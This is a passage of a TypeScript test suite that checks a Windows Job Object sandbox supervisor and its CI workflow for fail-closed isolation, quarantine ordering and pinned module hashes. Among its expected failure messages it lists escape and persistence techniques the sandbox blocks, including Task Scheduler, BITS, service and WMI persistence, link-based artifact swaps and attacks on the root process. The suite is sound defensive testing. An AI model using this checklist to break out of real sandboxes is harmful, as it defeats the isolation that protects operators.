    for (const action of ['actions/checkout@', 'actions/setup-node@', 'pnpm/action-setup@']) {
      const actionStart = producer.indexOf(`      - uses: ${action}`);
      const actionEnd = producer.indexOf('\n      - ', actionStart + 1);
      const step = producer.slice(actionStart, actionEnd);
      expect(actionStart).toBeGreaterThan(bootstrapStart);
      expect(step).toContain("if: matrix.platform != 'win32-x64'");
    }

    const platformSteps = producer.slice(stepsStart).split('\n      - ').slice(1);
    for (const step of platformSteps) {
      if (
        step.startsWith('name: Bootstrap supervised Windows conformance') ||
        step.startsWith('uses: actions/upload-artifact@') ||
        step.startsWith('uses: actions/attest-build-provenance@')
      ) {
        continue;
      }
      if (
        /(?:actions\/checkout|actions\/setup-node|pnpm\/action-setup|\bgit\b|\bnode\b|corepack|pnpm|rustup|rustc|cargo)/u.test(
          step,
        )
      ) {
        expect(step).toContain("if: matrix.platform != 'win32-x64'");
      }
    }
  });

  test('contains the reviewed suspended-create Job Object supervisor with fail-closed bounds', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const embedded = embeddedWindowsSupervisorSource(workflow);
    const production = readFileSync(
      resolve(projectRoot, 'scripts', 'windows-job-supervisor.cs'),
      'utf8',
    );
    expect(embedded).toBe(production);
    const sources = [embedded, production];

    for (const source of sources) {
      for (const required of [
        'WindowsIsolatedUser',
        'WindowsValidatedArtifact',
        'NetUserAdd',
        'NetUserSetInfo',
        'NetUserGetInfo',
        'NetUserDel',
        'UF_ACCOUNTDISABLE',
        'LogonUserW',
        'CheckTokenMembership',
        'CreateProcessWithLogonW',
        'LOGON_WITH_PROFILE',
        'ProtectCurrentProcess',
        'PROCESS_DUP_HANDLE',
        'WRITE_DAC',
        'WRITE_OWNER',
        'DuplicateHandle',
        'SetSecurityInfo',
        'DeleteProfileW',
        'SetFileSecurityW',
        'PROTECTED_DACL_SECURITY_INFORMATION',
        'CREATE_SUSPENDED',
        'CreateJobObjectW',
        'ConvertStringSecurityDescriptorToSecurityDescriptorW',
        'GetSecurityDescriptorControl',
        'GetAclInformation',
        'GetAce',
        'EqualSid',
        'JOB_OBJECT_SET_ATTRIBUTES',
        'JOB_OBJECT_ASSIGN_PROCESS',
        'JOB_OBJECT_TERMINATE',
        'AssignProcessToJobObject',
        'IsProcessInJob',
        'ResumeThread',
        'SetInformationJobObject',
        'JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE',
        'CreatePipe',
        'TerminateJobObject',
        'MaxStdoutBytes',
        'MaxStderrBytes',
        'TotalTimeout',
        'WindowsDirectoryQuota',
        'ResourceQuotaExceeded',
        'MeasureDirectoryBytes',
        'WaitForSingleObject',
        'QueryInformationJobObject',
        'JobObjectBasicAccountingInformation',
        'ActiveProcesses',
        'Schedule.Service',
        'TASK_ENUM_HIDDEN',
        'GetFolders',
        'GetTasks',
        'GetRunningTasks',
        'BG_JOB_ENUM_ALL_USERS',
        'BackgroundCopyManager',
        'GetOwner',
        'Cancel',
        'WTSEnumerateProcessesExW',
        'WTS_PROCESS_INFO_EXW',
        'WTSFreeMemoryExW',
        'MinimumStableIsolationRounds',
        'ExecuteQuarantineSecuritySequence',
        'QuarantineIsolatedIdentity',
        'IsQuarantineComplete',
        'RunProducerAsUserAndQuarantine',
        'RequireQuarantineCompleted',
        'ExecuteArtifactSecuritySequence',
        'CleanupScheduledTasks',
        'attributableScheduledTaskFolders',
        'RememberScheduledTaskFolderChain',
        'CleanupBitsJobs',
        'DrainProcessesByPrimaryTokenSid',
        'SealArtifactSource',
        'RequirePostSealIsolation',
        'CaptureIsolatedArtifact',
        'RequireCanonicalSchemaV2Artifact',
        'RunAsUserWithStandardInput',
        'PublishValidatedArtifact',
        'FILE_FLAG_OPEN_REPARSE_POINT',
        'GetFileInformationByHandle',
        'GetFileType',
        'NumberOfLinks',
        'FlushFileBuffers',
        'CloseHandle',
      ]) {
        expect(source).toContain(required);
      }
      expect(source.indexOf('GetExitCodeProcess(process.hProcess')).toBeLessThan(
        source.indexOf('TerminateJobAndWaitForZero(jobHandle'),
      );
      const finalTeardown = source.indexOf(
        'TerminateJobAndWaitForZero(\n                    jobHandle',
      );
      const finalQuotaCheck = source.indexOf(
        'DirectoryQuotasExceeded(DirectoryQuotas)',
        finalTeardown,
      );
      const finalOutputCheck = source.indexOf('Task.WaitAll(ioTasks.ToArray()', finalQuotaCheck);
      expect(finalTeardown).toBeGreaterThan(-1);
      expect(finalQuotaCheck).toBeGreaterThan(finalTeardown);
      expect(finalOutputCheck).toBeGreaterThan(finalQuotaCheck);
      expect(source).not.toContain('JOB_OBJECT_LIMIT_BREAKAWAY_OK');
      expect(source).not.toContain('JOB_OBJECT_LIMIT_SILENT_BREAKAWAY_OK');
      expect(source).not.toContain('CreateJobObjectW(IntPtr.Zero, name)');
      expect(source).not.toContain('private static extern bool CreateProcessW(');
      expect(source).not.toContain('Process.GetProcesses(');
      const usersMembership = source.slice(
        source.indexOf('private static void EnsureUsersGroupMembership'),
        source.indexOf('private static void ValidateStandardUserSnapshot'),
      );
      expect(usersMembership).toContain('NetLocalGroupAddMembers');
      expect(usersMembership).toContain('"S-1-5-32-545"');
      expect(usersMembership).toContain('ERROR_MEMBER_IN_ALIAS');
      expect(usersMembership).not.toContain('"S-1-5-32-544"');
      expect(source).toMatch(/"GetRunningTasks",\s+TASK_ENUM_HIDDEN/u);
      expect(source).toContain('Ephemeral local user cleanup failed during creation.');
      for (const failure of [
        'Restricted identity unexpectedly belongs to Administrators.',
        'PROCESS_DUP_HANDLE open unexpectedly succeeded.',
        'WRITE_DAC open unexpectedly succeeded.',
        'WRITE_OWNER open unexpectedly succeeded.',
        'DuplicateHandle unexpectedly succeeded.',
        'Supervisor DACL modification unexpectedly succeeded.',
        'Supervisor owner modification unexpectedly succeeded.',
      ]) {
        expect(source).toContain(failure);
      }
    }
  });

  test('pins the complete harness module graph before Windows or Unix executes it', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const windowsStep = workflowStep(workflow, 'Bootstrap supervised Windows conformance');
    const windowsRunBody = workflowRunBody(windowsStep);
    const unixStep = workflowStep(workflow, 'Prepare trusted Unix supervisor');
    const unixRunBody = workflowRunBody(unixStep);
    const lock = JSON.parse(
      readFileSync(resolve(projectRoot, 'phase1-conformance.lock.json'), 'utf8'),
    ) as {
      harnessAuthority: {
        files: Array<{ path: string; sha256: string }>;
      };
    };
    const moduleGraph = [
      ...new Set([
        ...staticLocalMjsModuleGraph('scripts/phase1-conformance.mjs'),
        ...staticLocalMjsModuleGraph('scripts/phase1-schema-v2-producer.mjs'),
        'scripts/contract-canary.mjs',
        'scripts/phase1-process-supervisor.mjs',
      ]),
    ].sort();

    expect(moduleGraph).toContain('scripts/phase1-schema-v2-producer.mjs');
    expect(moduleGraph).toContain('scripts/contract-canary.mjs');
    expect(moduleGraph).toContain('scripts/phase1-process-supervisor.mjs');
    for (const path of moduleGraph) {
      const bytes = readFileSync(resolve(projectRoot, path));
      const authority = lock.harnessAuthority.files.find((entry) => entry.path === path);
      expect(authority).toBeDefined();
      expect(windowsStep).toContain(
        `@('${path.replaceAll('/', '\\')}', ${bytes.byteLength}, '${sha256(bytes)}')`,
      );
      expect(unixStep).toContain(`['${path}', [${bytes.byteLength}, '${sha256(bytes)}']]`);
    }
    const windowsPinnedModules = [
      ...windowsStep.matchAll(/@\('(scripts\\[^']+\.mjs)', \d+, '[0-9a-f]{64}'\)/gu),
    ]
      .map((match) => match[1]?.replaceAll('\\', '/'))
      .filter((path): path is string => path !== undefined)
      .sort();
    const unixPinnedModules = [
      ...unixStep.matchAll(/\['(scripts\/[^']+\.mjs)', \[\d+, '[0-9a-f]{64}'\]\]/gu),
    ]
      .map((match) => match[1])
      .filter((path): path is string => path !== undefined)
      .sort();
    expect(windowsPinnedModules).toEqual(moduleGraph);
    expect(unixPinnedModules).toEqual(moduleGraph);

    const pinStart = windowsRunBody.indexOf('$trustedHarnessModules = @(');
    const pinComplete = windowsRunBody.indexOf(
      "Write-Host 'Frozen harness module graph verified.'",
    );
    const nodeStarts = [
      windowsRunBody.indexOf('& $node'),
      windowsRunBody.indexOf('-FilePath $npm'),
      windowsRunBody.indexOf('-FilePath $pnpm'),
    ].filter((index) => index >= 0);
    expect(pinStart).toBeGreaterThan(-1);
    expect(pinComplete).toBeGreaterThan(pinStart);
    expect(nodeStarts.length).toBeGreaterThan(0);
    expect(pinComplete).toBeLessThan(Math.min(...nodeStarts));

    const unixPinStart = unixRunBody.indexOf('const expected = new Map([');
    const unixPinComplete = unixRunBody.indexOf(
      "console.log('Frozen harness module graph verified.');",
    );
    expect(unixPinStart).toBeGreaterThan(-1);
    expect(unixPinComplete).toBeGreaterThan(unixPinStart);
    expect(unixPinComplete).toBeLessThan(unixRunBody.indexOf('\n          EOF'));
  });

  test('orders the fail-closed Windows artifact boundary before capture and publication', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const sources = [
      embeddedWindowsSupervisorSource(workflow),
      readFileSync(resolve(projectRoot, 'scripts', 'windows-job-supervisor.cs'), 'utf8'),
    ];

    for (const source of sources) {
      const sequenceStart = source.indexOf('private static void ExecuteArtifactSecuritySequence(');
      const sequenceEnd = source.indexOf('private int CleanupScheduledTasks(', sequenceStart);
      const sequence = source.slice(sequenceStart, sequenceEnd);
      expect(sequenceStart).toBeGreaterThan(-1);
      expect(sequenceEnd).toBeGreaterThan(sequenceStart);

      const quarantine = sequence.indexOf('requireQuarantine();');
      const seal = sequence.indexOf('sealArtifactSource();');
      const firstPostSeal = sequence.indexOf('requirePostSealIsolation();');
      const capture = sequence.indexOf('captureArtifact();');
      const secondPostSeal = sequence.indexOf('requirePostSealIsolation();', firstPostSeal + 1);

      expect(quarantine).toBeGreaterThan(-1);
      expect(seal).toBeGreaterThan(quarantine);
      expect(firstPostSeal).toBeGreaterThan(seal);
      expect(capture).toBeGreaterThan(firstPostSeal);
      expect(secondPostSeal).toBeGreaterThan(capture);

      const captureStart = source.indexOf(
        'public WindowsValidatedArtifact CaptureIsolatedArtifact(',
      );
      const canonicalStart = source.indexOf(
        'public static void RequireCanonicalSchemaV2Artifact(',
        captureStart,
      );
      const captureMethod = source.slice(captureStart, canonicalStart);
      expect(captureMethod).toContain('ExecuteArtifactSecuritySequence(');
      expect(captureMethod).toContain('RequireQuarantineCompleted(isolatedUser)');
      expect(captureMethod).toContain('SealArtifactSource(');
      expect(captureMethod).toContain('RequirePostSealIsolation(');
    }

    const runBody = workflowRunBody(
      workflowStep(workflow, 'Bootstrap supervised Windows conformance'),
    );
    const resultCheck = runBody.indexOf('Supervised Windows production failed with exit code');
    const postProduction = runBody.slice(resultCheck);
    const capture = postProduction.indexOf('$job.CaptureIsolatedArtifact(');
    const validation = postProduction.indexOf(
      '[OpenCoven.WindowsJobSupervisor]::RequireCanonicalSchemaV2Artifact(',
      capture,
    );
    const publish = postProduction.indexOf('$job.PublishValidatedArtifact(', validation);
    expect(capture).toBeGreaterThan(-1);
    expect(validation).toBeGreaterThan(capture);
    expect(publish).toBeGreaterThan(validation);
    expect(postProduction).not.toContain('$job.RunAsUserWithStandardInput(');
  });

  test('runs terminal Windows identity quarantine after every producer outcome', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const sources = [
      embeddedWindowsSupervisorSource(workflow),
      readFileSync(resolve(projectRoot, 'scripts', 'windows-job-supervisor.cs'), 'utf8'),
    ];

    for (const source of sources) {
      const quarantineStart = source.indexOf(
        'private static void ExecuteQuarantineSecuritySequence(',
      );
      const quarantineEnd = source.indexOf(
        'private static void ExecuteArtifactSecuritySequence(',
        quarantineStart,
      );
      const quarantine = source.slice(quarantineStart, quarantineEnd);
      expect(quarantineStart).toBeGreaterThan(-1);
      expect(quarantineEnd).toBeGreaterThan(quarantineStart);
      const terminate = quarantine.indexOf('terminateAndReapJob();');
      const jobZero = quarantine.indexOf('requireJobZero();');
      const disable = quarantine.indexOf('disableAccount();');
      const scheduler = quarantine.indexOf('cleanupScheduledTasks();');
      const bits = quarantine.indexOf('cleanupBitsJobs();');
      const processes = quarantine.indexOf('drainProcessesByPrimaryTokenSid();');
      const finalProof = quarantine.indexOf('requireFinalIsolation();');
      expect(terminate).toBeGreaterThan(-1);
      expect(jobZero).toBeGreaterThan(terminate);
      expect(disable).toBeGreaterThan(jobZero);
      expect(scheduler).toBeGreaterThan(disable);
      expect(bits).toBeGreaterThan(scheduler);
      expect(processes).toBeGreaterThan(bits);
      expect(finalProof).toBeGreaterThan(processes);
      expect(quarantine).toContain('stableRounds < MinimumStableIsolationRounds');
      expect(quarantine).toContain('cleanupFailures');
      expect(source).toContain('RememberScheduledTaskFolderChain(match.FolderPath);');
      expect(source).toContain('preProductionScheduledTaskFolders');
      expect(source).toContain('SnapshotExistingScheduledTaskFolders');
      expect(source).toContain('IsRunCreatedScheduledTaskFolder');
      expect(source).toContain('ScheduledTaskFolderIsEmpty');
      expect(source).toContain('RevalidateFailedProcessOpen');
      expect(source).toContain('ERROR_INVALID_PARAMETER');
      expect(source).toContain('Matching isolated-SID process identity changed.');
      expect(source).toContain(
        'RevalidateFailedProcessOpen(\n                            processId,\n                            supervisedSid,\n                            openError,',
      );

      const terminalStart = source.indexOf(
        'private WindowsJobRunResult RunProducerAsUserAndQuarantineCore(',
      );
      const terminalEnd = source.indexOf(
        'private WindowsJobRunResult RunAsUserCore(',
        terminalStart,
      );
      const terminal = source.slice(terminalStart, terminalEnd);
      expect(terminalStart).toBeGreaterThan(-1);
      expect(terminalEnd).toBeGreaterThan(terminalStart);
      expect(terminal).toContain('finally');
      expect(terminal).toContain('QuarantineIsolatedIdentity();');
      expect(terminal).toContain('new AggregateException(');
      expect(terminal).toContain('terminalProducerSucceeded =');
      expect(terminal.indexOf('terminalProducerSucceeded = false;')).toBeLessThan(
        terminal.indexOf('result = RunAsUserCore('),
      );
      expect(
        terminal.indexOf(
          'terminalProducerSucceeded =\n                        result.ExitCode == 0',
        ),
      ).toBeLessThan(terminal.indexOf('finally'));

      const quarantineMethodStart = source.indexOf('public void QuarantineIsolatedIdentity()');
      const quarantineMethodEnd = source.indexOf(
        'private void RequireQuarantineCompleted(',
        quarantineMethodStart,
      );
      const quarantineMethod = source.slice(quarantineMethodStart, quarantineMethodEnd);
      const completedReturn = quarantineMethod.indexOf(
        'if (quarantineCompleted)\n                {\n                    return;',
      );
      const inProgressReject = quarantineMethod.indexOf('if (quarantineInProgress)');
      const executeSequence = quarantineMethod.indexOf('ExecuteQuarantineSecuritySequence(');
      const markCompleted = quarantineMethod.indexOf('quarantineCompleted = true;');
      expect(completedReturn).toBeGreaterThan(-1);
      expect(inProgressReject).toBeGreaterThan(completedReturn);
      expect(executeSequence).toBeGreaterThan(inProgressReject);
      expect(markCompleted).toBeGreaterThan(executeSequence);

      const captureStart = source.indexOf(
        'public WindowsValidatedArtifact CaptureIsolatedArtifact(',
      );
      const captureEnd = source.indexOf(
        'public static void RequireCanonicalSchemaV2Artifact(',
        captureStart,
      );
      const capture = source.slice(captureStart, captureEnd);
      expect(capture).toContain('RequireQuarantineCompleted(isolatedUser);');
      expect(capture).not.toContain('isolatedUser.DisableAndVerify()');
      expect(capture).not.toContain('CleanupScheduledTasks()');
      expect(capture).not.toContain('CleanupBitsJobs()');
      expect(capture).not.toContain('DrainProcessesByPrimaryTokenSid()');

      const disposeStart = source.indexOf('public void Dispose()', captureEnd);
      const disposeEnd = source.indexOf('private void ThrowIfDisposed()', disposeStart);
      const dispose = source.slice(disposeStart, disposeEnd);
      expect(dispose.indexOf('QuarantineIsolatedIdentity();')).toBeGreaterThan(-1);
      expect(dispose.indexOf('TerminateJobAndWaitForZero(')).toBeGreaterThan(
        dispose.indexOf('QuarantineIsolatedIdentity();'),
      );

      const isolatedUserStart = source.indexOf('public sealed class WindowsIsolatedUser');
      const userDisposeStart = source.indexOf(
        'public void Dispose()',
        source.indexOf('private static string GetProfilesRoot()', isolatedUserStart),
      );
      const userDisposeEnd = source.indexOf(
        '[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]',
        userDisposeStart,
      );
      const userDispose = source.slice(userDisposeStart, userDisposeEnd);
      expect(userDispose.indexOf('quarantineIsolatedIdentity();')).toBeGreaterThan(-1);
      expect(userDispose.indexOf('DeleteOperatingSystemProfile(')).toBeGreaterThan(
        userDispose.indexOf('quarantineIsolatedIdentity();'),
      );
      expect(userDispose.indexOf('DeleteDirectoryTree(RootPath)')).toBeGreaterThan(
        userDispose.indexOf('quarantineIsolatedIdentity();'),
      );
      expect(userDispose.indexOf('NetUserDel(null, UserName)')).toBeGreaterThan(
        userDispose.indexOf('quarantineIsolatedIdentity();'),
      );
      expect(userDispose).toContain('new AggregateException(');
    }

    const runBody = workflowRunBody(
      workflowStep(workflow, 'Bootstrap supervised Windows conformance'),
    );
    const production = runBody.slice(runBody.indexOf('$result = $job.'));
    expect(production).toContain('$result = $job.RunProducerAsUserAndQuarantine(');
    expect(production.indexOf('$job.CaptureIsolatedArtifact(')).toBeGreaterThan(
      production.indexOf('Supervised Windows production failed with exit code'),
    );
    const cleanup = production.slice(production.lastIndexOf('} finally {'));
    expect(cleanup.indexOf('$isolatedUser.Dispose()')).toBeGreaterThan(-1);
    expect(cleanup.indexOf('$job.Dispose()')).toBeGreaterThan(
      cleanup.indexOf('$isolatedUser.Dispose()'),
    );
  });

  test('uses the official eleven-parameter CreateProcessWithLogonW signature and call order', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const sources = [
      embeddedWindowsSupervisorSource(workflow),
      readFileSync(resolve(projectRoot, 'scripts', 'windows-job-supervisor.cs'), 'utf8'),
    ];
    const normalize = (value: string) => value.replace(/\s+/gu, ' ').trim();

    for (const source of sources) {
      const declaration = source.match(
        /private static extern bool CreateProcessWithLogonW\(([\s\S]*?)\);/u,
      );
      expect(declaration).not.toBeNull();
      expect(normalize(declaration?.[1] ?? '')).toBe(
        [
          'string userName,',
          'string domain,',
          'string password,',
          'uint logonFlags,',
          'string applicationName,',
          'StringBuilder commandLine,',
          'uint creationFlags,',
          'IntPtr environment,',
          'string currentDirectory,',
          'ref STARTUPINFO startupInfo,',
          'out PROCESS_INFORMATION processInformation',
        ].join(' '),
      );

      const invocation = source.match(/bool created = CreateProcessWithLogonW\(([\s\S]*?)\);/u);
      expect(invocation).not.toBeNull();
      expect(normalize(invocation?.[1] ?? '')).toBe(
        [
          'isolatedUser.UserName,',
          'Environment.MachineName,',
          'isolatedUser.Password,',
          'LOGON_WITH_PROFILE,',
          'applicationName,',
          'commandLine,',
          'CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW,',
          'environmentBlock,',
          'workingDirectory,',
          'ref startup,',
          'out process',
        ].join(' '),
      );
    }
  });

  test('protects the authoritative root handle before resume and tests live-root forgery attacks', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const sources = [
      embeddedWindowsSupervisorSource(workflow),
      readFileSync(resolve(projectRoot, 'scripts', 'windows-job-supervisor.cs'), 'utf8'),
    ];

    for (const source of sources) {
      for (const required of [
        'PROCESS_TERMINATE',
        'PROCESS_CREATE_THREAD',
        'PROCESS_VM_OPERATION',
        'PROCESS_VM_WRITE',
        'PROCESS_DUP_HANDLE',
        'PROCESS_SET_INFORMATION',
        'PROCESS_SUSPEND_RESUME',
        'ProtectRootProcess',
        'ProtectProcessSecurity',
        'ValidateProcessSecurity',
        'OWNER_SECURITY_INFORMATION |',
        'PROTECTED_DACL_SECURITY_INFORMATION',
        'PROCESS_QUERY_LIMITED_INFORMATION | SYNCHRONIZE',
      ]) {
        expect(source).toContain(required);
      }

      const created = source.indexOf('bool created = CreateProcessWithLogonW(');
      const assigned = source.indexOf(
        'if (!AssignProcessToJobObject(jobHandle, process.hProcess))',
        created,
      );
      const protectedRoot = source.indexOf(
        'ProtectRootProcess(process.hProcess, isolatedUser.Sid);',
        assigned,
      );
      const resumed = source.indexOf('uint resumeResult = ResumeThread(process.hThread);', created);
      expect(created).toBeGreaterThan(-1);
      expect(assigned).toBeGreaterThan(created);
      expect(protectedRoot).toBeGreaterThan(assigned);
      expect(resumed).toBeGreaterThan(protectedRoot);

      const protectionStart = source.indexOf('private static void ProtectProcessSecurity(');
      const validationStart = source.indexOf(
        'private static void ValidateProcessSecurity(',
        protectionStart,
      );
      const validationEnd = source.indexOf(
        'public static void RequireRestrictedSupervisorBoundary(',
        validationStart,
      );
      const protection = source.slice(protectionStart, validationStart);
      const validation = source.slice(validationStart, validationEnd);
      expect(protection).toContain('string sddl = "O:" + supervisorSid + "D:P"');
      expect(protection).toContain('SetKernelObjectSecurity(');
      expect(protection).toContain('OWNER_SECURITY_INFORMATION |');
      expect(protection).toContain('DACL_SECURITY_INFORMATION |');
      expect(protection).toContain('PROTECTED_DACL_SECURITY_INFORMATION');
      expect(validation).toContain('!EqualSid(owner, expectedOwner)');
      expect(validation).toContain('aclInformation.AceCount != 4');
      expect(validation).toContain('(PROCESS_QUERY_LIMITED_INFORMATION | SYNCHRONIZE)');
      expect(validation).toContain('(ace.Mask & PROCESS_MUTATION_ACCESS) == 0');
    }

    const runtimeTest = readFileSync(
      resolve(projectRoot, 'scripts', 'windows-job-supervisor.test.ps1'),
      'utf8',
    );
    for (const requiredCase of [
      'CreateProcessWithLogonW parameter count changed.',
      'CreateProcessWithLogonW parameter names or types changed.',
      'Root PROCESS_TERMINATE open unexpectedly succeeded.',
      'Root TerminateProcess unexpectedly succeeded.',
      'Root WRITE_DAC open unexpectedly succeeded.',
      'Root WRITE_OWNER open unexpectedly succeeded.',
      'Root PROCESS_DUP_HANDLE open unexpectedly succeeded.',
      'Root PROCESS_VM_READ open unexpectedly succeeded.',
      'Root PROCESS_VM_WRITE or PROCESS_VM_OPERATION open unexpectedly succeeded.',
      'Root PROCESS_CREATE_THREAD open unexpectedly succeeded.',
      'Root PROCESS_CREATE_PROCESS open unexpectedly succeeded.',
      'Root PROCESS_SET_QUOTA open unexpectedly succeeded.',
      'Root PROCESS_SET_INFORMATION open unexpectedly succeeded.',
      'Root PROCESS_QUERY_INFORMATION open unexpectedly succeeded.',
      'Root PROCESS_SUSPEND_RESUME open unexpectedly succeeded.',
      'Root PROCESS_SET_LIMITED_INFORMATION open unexpectedly succeeded.',
      'Root DELETE open unexpectedly succeeded.',
      'Live root in-place artifact forgery was authorized.',
      'Live root replacement artifact forgery was authorized.',
      '[RootProcessAttack]::Run(',
      'TerminateProcess(root, 0)',
    ]) {
      expect(runtimeTest).toContain(requiredCase);
    }
  });

  test('runs the native Job Object tree tests in the ordinary Windows CI job', () => {
    const workflow = readFileSync(resolve(projectRoot, '.github', 'workflows', 'ci.yml'), 'utf8');
    const windowsJob = workflow.slice(workflow.indexOf('  windows-supervisor-behavior:'));
    const runtimeTest = readFileSync(
      resolve(projectRoot, 'scripts', 'windows-job-supervisor.test.ps1'),
      'utf8',
    );
    const conformance = readFileSync(
      resolve(projectRoot, 'src-tauri', 'src', 'conformance.rs'),
      'utf8',
    );
    const guard = conformance.slice(
      conformance.indexOf('fn require_windows_job_supervision_from_environment()'),
      conformance.indexOf(
        '#[cfg(not(windows))]\nfn require_windows_job_supervision_from_environment()',
      ),
    );

    expect(windowsJob.indexOf('Build phase1 native RPC')).toBeLessThan(
      windowsJob.indexOf('Test Windows Job Object supervision'),
    );
    expect(windowsJob).toContain('runs-on: windows-2025');
    expect(windowsJob).toContain(
      'cargo build --manifest-path src-tauri/Cargo.toml --features phase1-conformance --bin phase1-native-rpc',
    );
    expect(windowsJob).toContain(
      'OPENCOVEN_PHASE1_NATIVE_RPC_PATH: src-tauri\\target\\debug\\phase1-native-rpc.exe',
    );
    expect(windowsJob).toContain('name: Test Windows Job Object supervision');
    expect(windowsJob).toContain(
      'pwsh -NoLogo -NoProfile -NonInteractive -File scripts/windows-job-supervisor.test.ps1',
    );
    const nonEvidenceReturn = guard.indexOf('Err(env::VarError::NotPresent) => return Ok(())');
    expect(nonEvidenceReturn).toBeGreaterThan(-1);
    expect(nonEvidenceReturn).toBeLessThan(guard.indexOf('env::var(WINDOWS_JOB_REQUIRED_ENV)'));
    for (const requiredCase of [
      'Positive Job Object membership failed.',
      'A process in Job B was accepted as a member of existing Job A.',
      'An unsupervised process was accepted as a member of an existing Job.',
      'Ordinary non-evidence native RPC execution changed.',
      'Missing native Job binding',
      'Malformed native evidence mode',
      'Malformed native Job binding',
      'Nonexistent native Job binding',
      'Unsupervised native process with valid existing Job A binding',
      'Wrong existing native Job binding',
      'Valid native Job binding did not reach native RPC startup.',
      'Directory quota excess did not fail closed.',
      'Successful root teardown did not terminate the retained Job handle descendant.',
      'Query-only Job Object reopen was denied.',
      'JOB_OBJECT_SET_ATTRIBUTES reopen unexpectedly succeeded.',
      'JOB_OBJECT_ASSIGN_PROCESS reopen unexpectedly succeeded.',
      'JOB_OBJECT_TERMINATE reopen unexpectedly succeeded.',
      'Enabling silent breakaway unexpectedly succeeded.',
      'Restricted user profile is outside the isolated root.',
      'Restricted user temporary directory is outside the isolated root.',
      'Restricted user workspace is outside the isolated root.',
      'Restricted identity accessed supervisor-private credential root.',
      'Symlink replacement artifact handoff unexpectedly succeeded.',
      'Hardlink artifact handoff unexpectedly succeeded.',
      'Parent junction artifact handoff unexpectedly succeeded.',
      'Wrong-owner artifact handoff unexpectedly succeeded.',
      'Permissive-DACL artifact handoff unexpectedly succeeded.',
      'Artifact replacement race exposed supervisor-only canary bytes.',
      'Task Scheduler escape registration survived broker cleanup.',
      'Service-mediated persistence rewrote the sealed artifact.',
      'A task registered after account disablement survived repeated cleanup.',
      'Pre-existing shared Task Scheduler parent was removed by quarantine.',
      'Pre-existing Task Scheduler folder was removed by quarantine.',
      'Run-created Task Scheduler child survived quarantine.',
      'Matching task registration in a pre-existing folder survived quarantine.',
      'BITS service-mediated job survived broker cleanup.',
      'Ephemeral account was not disabled by terminal quarantine.',
      'Account-disable verification failure did not fail closed.',
      'Task Scheduler enumeration failure did not fail closed.',
      'BITS enumeration failure did not fail closed.',
      'WTS process enumeration failure did not fail closed.',
      'Matching process access failure did not fail closed.',
      'Matching process termination failure did not fail closed.',
      'Matching isolated-SID process disappearance was not revalidated.',
      'Reused PID with a different SID was not accepted after revalidation.',
      'Still-matching PID was accepted after failed OpenProcess revalidation.',
      'Matching process access denial did not remain fail closed.',
      'Unstable SID-wide process drain did not fail closed.',
      'Artifact ACL sealing failure did not fail closed.',
      'Service creation unexpectedly succeeded for the restricted identity.',
      'SC_MANAGER_CREATE_SERVICE was not denied with ERROR_ACCESS_DENIED.',
      'CreateServiceW was not denied with ERROR_ACCESS_DENIED.',
      'Denied native service creation left a registered service.',
      'Permanent WMI subscription creation unexpectedly succeeded.',
      'Task Scheduler action markers were only partially present after quarantine.',
      'Task Scheduler action process did not run as the exact isolated SID.',
      'Nonzero producer result changed during terminal quarantine.',
      'Nonzero producer artifact capture was not rejected.',
      'A task registration/run attempt after account disablement was not exercised.',
      'Ephemeral local user survived cleanup.',
      'Ephemeral Windows profile survived cleanup.',
      'Ephemeral bootstrap root survived cleanup.',
    ]) {
      expect(runtimeTest).toContain(requiredCase);
    }
    for (const nativeScmToken of [
      'OpenSCManagerW',
      'CreateServiceW',
      'OpenServiceW',
      'SC_MANAGER_CREATE_SERVICE',
      'ERROR_ACCESS_DENIED',
      'ERROR_SERVICE_DOES_NOT_EXIST',
    ]) {
      expect(runtimeTest).toContain(nativeScmToken);
    }
    expect(runtimeTest).not.toContain('& `$sc create');
    expect(runtimeTest).toContain('$definition.Principal.LogonType = 3');
    expect(runtimeTest).toContain('.CreateFolder(');
    expect(runtimeTest).toContain('[Security.Principal.WindowsIdentity]::GetCurrent().User.Value');
    expect(runtimeTest).toContain('.RunProducerAsUserAndQuarantine(');
    expect(runtimeTest).toContain('OpenCoven-PrincipalOnly-');
    for (const nativeTaskProbeToken of [
      'ScheduledActionIsolationProbe',
      'AssertAliveOutsideAuthoritativeJobWithPrimaryTokenSid',
      'OpenJobObjectW',
      'OpenProcess',
      'IsProcessInJob',
      'OpenProcessToken',
      'GetTokenInformation',
      'GetExitCodeProcess',
      'Deterministic service-equivalent exact-SID process',
      'Nonzero persistence process PID',
      'Terminal failure deterministic exact-SID process',
    ]) {
      expect(runtimeTest).toContain(nativeTaskProbeToken);
    }
    expect(runtimeTest).toContain('function Assert-OptionalScheduledActionDrained');
    expect(runtimeTest).toContain('registered-after-disable-run-attempted');
    expect(runtimeTest).toContain('scheduler-run-attempted-and-bits-created');
    expect(runtimeTest).toContain('catch [Runtime.InteropServices.COMException]');
    expect(runtimeTest).toContain('RunAttempted = $true');
    expect(runtimeTest).toContain('RunErrorHResult = $runErrorHResult');
    expect(runtimeTest).toContain(
      'Task Scheduler run attempt failed without a fail-closed non-running state.',
    );
    expect(runtimeTest).not.toContain('Task Scheduler action did not write its started marker.');
    expect(runtimeTest).not.toContain('Late task action did not expose a live running instance.');
    expect(runtimeTest).not.toContain(
      'Nonzero producer task never reached a running exact-SID action.',
    );
    expect(runtimeTest).not.toContain('Nonzero producer scheduled action did not actually run.');
    expect(runtimeTest).toContain(
      '    $taskActionTemplate = [IO.File]::ReadAllText($taskActionScript)',
    );
    expect(runtimeTest).not.toContain(
      '\n$taskActionTemplate = [IO.File]::ReadAllText($taskActionScript)',
    );

    const principalOnlyStart = runtimeTest.indexOf(
      'function Register-PrincipalOnlyInteractiveTask {',
    );
    const principalOnlyEnd = runtimeTest.indexOf(
      '\n    $lateRegistrarScript =',
      principalOnlyStart,
    );
    const principalOnlyTask = runtimeTest.slice(principalOnlyStart, principalOnlyEnd);
    expect(principalOnlyStart).toBeGreaterThan(-1);
    expect(principalOnlyEnd).toBeGreaterThan(principalOnlyStart);
    for (const required of [
      '$definition.RegistrationInfo.Description =',
